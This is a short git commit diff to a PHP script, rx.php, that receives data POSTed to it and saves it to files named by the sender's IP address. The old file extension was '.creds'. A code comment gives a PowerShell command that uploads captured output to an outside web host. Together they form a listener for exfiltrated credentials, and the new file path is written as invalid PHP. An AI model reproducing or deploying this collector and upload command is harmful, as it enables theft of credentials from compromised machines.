ece897050786c9baecdec7e960befcd07f33163f
Kenfrost1987 <anthony.wratten@kenfrost1987.com.au>
2017-03-30 15:27:26 +1000

    change directory

--- web/rx.php
+++ web/rx.php
@@ -5,6 +5,6 @@
  * powershell "IEX (New-Object Net.WebClient).UploadString('http://darren.kitchen/rx.php', $output)"
  */
 
-$file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".creds";
-file_put_contents($file, file_get_contents("php://input"));
+$file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".txt";
+file_put_contents(uploads/$file, file_get_contents("php://input"));
 
